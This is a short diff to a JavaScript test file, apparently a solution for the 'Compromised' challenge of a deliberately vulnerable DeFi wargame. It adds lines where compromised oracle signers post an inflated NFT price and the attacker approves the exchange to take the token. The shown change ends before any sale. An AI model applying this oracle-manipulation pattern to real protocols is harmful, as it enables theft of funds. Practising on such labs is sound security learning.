@@ -87,6 +87,16 @@ describe("Compromised challenge", function () {
     await oracle.connect(signer2).postPrice("DVNFT", NEW_PRICE);
     /**Attacker buy NFT at reduced price */
     await exchange.connect(player).buyOne({ value: NEW_PRICE });
+    /**Malicious oracles raise price and attacker sell NFT to the exchange */
+    await oracle
+      .connect(signer1)
+      .postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_PRICE);
+    await oracle
+      .connect(signer2)
+      .postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_PRICE);
+
+    await nftToken.connect(player).approve(exchange.address, 0);
+
   });
 
   after(async function () {
